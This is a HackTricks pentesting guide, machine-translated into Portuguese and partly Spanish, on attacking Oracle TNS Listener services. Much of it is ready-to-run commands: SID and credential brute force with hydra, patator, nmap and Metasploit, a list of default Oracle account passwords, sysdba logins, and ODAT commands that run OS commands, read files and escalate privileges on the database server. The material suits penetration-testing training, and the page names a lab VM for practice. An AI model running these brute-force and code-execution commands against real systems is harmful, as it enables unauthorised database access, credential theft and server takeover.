# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informações Básicas

O banco de dados Oracle (Oracle DB) é um sistema de gerenciamento de banco de dados relacional (RDBMS) da Oracle Corporation (a partir daqui [aqui](https://www.techopedia.com/definition/8711/oracle-database)).

Ao enumerar o Oracle, o primeiro passo é falar com o TNS-Listener que geralmente reside na porta padrão (1521/TCP, - você também pode obter ouvintes secundários em 1522-1529-).
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## Resumo

1. **Enumerar a versão** (procurar por **vulnerabilidades conhecidas**)
2. **Forçar a comunicação do ouvinte TNS** (nem sempre necessário)
3. **Enumerar**/Forçar **nomes SID** (como nomes de banco de dados)
4. **Forçar credenciais** para o nome SID válido descoberto
5. Tentar **executar código**

Para usar os módulos oracle do MSF, você precisa instalar algumas dependências: [**Instalação**](oracle-pentesting-requirements-installation.md)

## Enumeração

As ferramentas que podem ser usadas para isso são: nmap, MSF e [tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip).

### Versão do ouvinte TNS
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
Outros comandos úteis do TNS listener:

| **Comando**   | **Propósito**                                                   |
| ------------- | --------------------------------------------------------------- |
| ping          | Pingar o listener                                               |
| version       | Fornecer a saída da versão do listener e informações da plataforma |
| status        | Retornar o status atual e variáveis usadas pelo listener         |
| services      | Despejar dados de serviço                                        |
| debug         | Despejar informações de depuração no log do listener             |
| reload        | Recarregar o arquivo de configuração do listener                 |
| save\_config  | Escrever o arquivo de configuração do listener em um local de backup |
| stop          | Invocar o desligamento do listener                               |

Se você **receber um erro**, pode ser porque as **versões do TNS são incompatíveis** (Use o parâmetro `--10G` com `tnscmd10`) e se o **erro persistir**, o listener pode estar **protegido por senha** (você pode ver uma lista onde todos os [**erros são detalhados aqui**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)) - não se preocupe... hydra para o resgate\*\*:\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
O TNS listener pode ser vulnerável a ataques **MitM**. [Verifique aqui como verificar se o servidor é vulnerável e como realizar o ataque (todas as versões até a versão 12c são)](tns-poison.md).

### Enumeração de SID

#### **O que é um SID**

O SID (Service Identifier) é essencialmente o nome do banco de dados, dependendo da instalação, você pode ter um ou mais SIDs padrão, ou até mesmo um SID definido pelo dba totalmente personalizado.

**Em algumas versões antigas (na versão 9 funciona)**, você pode solicitar o SID e o banco de dados enviá-lo para você:
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
Se você não conseguir acessar os SIDs dessa maneira, precisará fazer um bruteforce:

**Bruteforce de SID**

Eu combinei as listas de SIDs do nmap e do MSF em uma só (sem duplicatas):

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
Para usar o **oracle\_login** com o **patator**, você precisa **instalar**:
```
pip3 install cx_Oracle --upgrade
```
## **Mirando Cuentas**

¿Tienes el SID? Excelente, ahora pasemos a la siguiente tarea y extraigamos la información de la cuenta de usuario. A partir de este punto, puedes conectarte al listener y hacer fuerza bruta a las credenciales.

**Metasploit** _\*\*scanner/oracle/oracle\_login_ tiene un diccionario incorporado para las **valores predeterminados más populares de la información de la cuenta de usuario** presentados como login:password. Por cierto, tales entradas predeterminadas representan uno de los problemas de seguridad más populares y graves en Oracle.

**Nmap** también puede ayudar aquí con el script _oracle-brute_. Ten en cuenta que este script **mezcla los logins y las contraseñas**, es decir, prueba cada login contra cada contraseña, ¡y tarda bastante tiempo!

### **Contraseñas Predeterminadas**

A continuación se muestran algunas de las contraseñas predeterminadas asociadas con Oracle:

* **DBSNMP/DBSNMP** — El Agente Inteligente lo usa para hablar con el servidor de la base de datos (es un poco de trabajo cambiarlo)
* **SYS/CHANGE\_ON\_INSTALL** — Cuenta sysdba predeterminada antes e incluyendo Oracle v9, a partir de la versión 10g ¡esto tiene que ser diferente!
* **PCMS\_SYS/PCMS\_SYS** — Cuenta x predeterminada
* **WMSYS/WMSYS** — Cuenta x predeterminada
* **OUTLN/OUTLN** — Cuenta x predeterminada
* **SCOTT/TIGER** — Cuenta x predeterminada

Otras **contraseñas predeterminadas** se pueden encontrar [aquí](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm) y [aquí](https://cirt.net/passwords?vendor=Oracle).

Las versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2 y 11.2.0.3 son vulnerables a **fuerza bruta offline**. [**Lee más sobre esta técnica aquí.**](remote-stealth-pass-brute-force.md)

### Fuerza Bruta de Usuario/Contraseña

Diferentes herramientas ofrecen **diferentes listas de usuario/contraseña** para Oracle:

* **oscan:** _/usr/share/oscanner/accounts.default_ (169 líneas)
* **MSF-1:** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598 líneas)
* **MSF-2:** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568 líneas)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687 líneas)

He **mezclado** todas ellas y **eliminado duplicados:**

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [Fuerza Bruta](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

Ahora que **conoces un SID válido y credenciales válidas**. Para conectarte a la base de datos necesitas la herramienta: _**sqlplus**_ y para instalarla necesitas seguir algunos pasos:

[Instalación](oracle-pentesting-requirements-installation.md)

Para iniciar sesión usando credenciales conocidas:
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
Se o TNS Listener estiver em uma porta não padrão (por exemplo, TCP/1522):
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
Se uma **conta tem privilégios de banco de dados do sistema (sysdba) ou operador do sistema (sysop)**, você pode tentar o seguinte:
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **Tudo em Um**

**Uma ferramenta interessante é o oscanner**, que tentará obter um SID válido e, em seguida, fará força bruta para obter credenciais válidas e tentará extrair algumas informações:
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
Outra ferramenta que fará tudo isso é o [**odat**](https://github.com/quentinhardy/odat):
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
Com essas opções (_-s_ e _-p_), o ODAT irá **procurar por SIDs válidos** (System ID) em um primeiro passo. Você pode configurar algumas opções para configurar os métodos (por exemplo, lista de palavras ou ataque de força bruta). Por padrão, o ODAT usará uma grande lista de palavras e fará um pequeno ataque de força bruta.

Se o ODAT **encontrar pelo menos um SID** (por exemplo, _ORCL_), ele irá **procurar por contas Oracle válidas**. Ele fará isso em **cada SID encontrado**. Você pode especificar algumas opções para credenciais (por exemplo, _--accounts-file_, _--accounts-files_, _--login-as-pwd_).

Para **cada conta válida** (por exemplo, _SYS_) **em cada instância válida** (SID), o ODAT retornará **o que cada usuário Oracle pode fazer** (por exemplo, shell reverso, ler arquivos, se tornar DBA).

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## Execução Remota de Código

Existem pelo menos duas maneiras diferentes de executar comandos, como usar procedimentos Java e o pacote DBMS\_SCHEDULER. De qualquer forma, você também pode obter RCE em caso de injeção de SQL em um aplicativo da web, desde que o usuário que o executa tenha direitos suficientes. Nesta etapa, eu recomendo altamente preparar a Ferramenta de Ataque ao Banco de Dados Oracle: [ODAT](https://github.com/quentinhardy/odat).
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Executando código via Procedimento Armazenado em Java
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
### Executando código via Scheduler

O Oracle Scheduler é um componente do Oracle Database que permite agendar e executar tarefas automaticamente. É possível explorar vulnerabilidades no Scheduler para executar código malicioso no servidor.

Para explorar essa vulnerabilidade, é necessário ter privilégios de DBA ou CREATE JOB. O atacante pode criar um job malicioso que execute o código desejado e agendar sua execução. Quando o job é executado, o código malicioso é executado no servidor.

Para evitar essa vulnerabilidade, é importante limitar o acesso ao Scheduler e garantir que apenas usuários confiáveis tenham permissão para criar jobs. Além disso, é importante manter o banco de dados atualizado com as últimas atualizações de segurança.
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
### Executar código via Tabelas Externas

[More details here](oracle-rce-and-more.md#rce-scheduler)
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‘ODAT.py’ requer o privilégio ‘CREATE ANY DIRECTORY’, que por padrão é concedido apenas à função DBA, já que tenta executar o arquivo de qualquer diretório e não apenas do “seu” diretório (a versão manual deste ataque requer menos privilégios).

[Mais detalhes aqui.](oracle-rce-and-more.md#rce-external-tables)

## Ler/Escrever arquivos
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[Mais detalhes aqui](oracle-rce-and-more.md#read-write-files)

## Elevando Privilégios

[Mais detalhes aqui](oracle-rce-and-more.md#elevating-privileges)

Você pode usar o módulo [privesc](https://github.com/quentinhardy/odat/wiki/privesc) do odat para elevar privilégios. Nesse link, você pode encontrar **várias maneiras de elevar privilégios usando o odat.**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
Vulnerabilidade testada no Oracle 10.1.0.3.0 - deve funcionar até o 10.1.0.5.0 e supostamente no 11g. Corrigido com a atualização crítica do Oracle de outubro de 2007.
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## Ambiente Virtual Gratuito para Testes

Se você deseja praticar ataques a bancos de dados Oracle, a maneira mais segura é se registrar para o Oracle Developer Days Virtualbox VM:

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

A maior parte das informações neste post foi extraída de: [https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) e de [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

Outras **referências** interessantes:

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## Comandos Automáticos do HackTricks
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for Oracle
  Note: |
    Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

    #great oracle enumeration tool
    navigate to https://github.com/quentinhardy/odat/releases/
    download the latest
    tar -xvf odat-linux-libc2.12-x86_64.tar.gz
    cd odat-libc2.12-x86_64/
    ./odat-libc2.12-x86_64 all -s 10.10.10.82

    for more details check https://github.com/quentinhardy/odat/wiki

    https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
  Name: Nmap
  Description: Nmap with Oracle Scripts
  Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
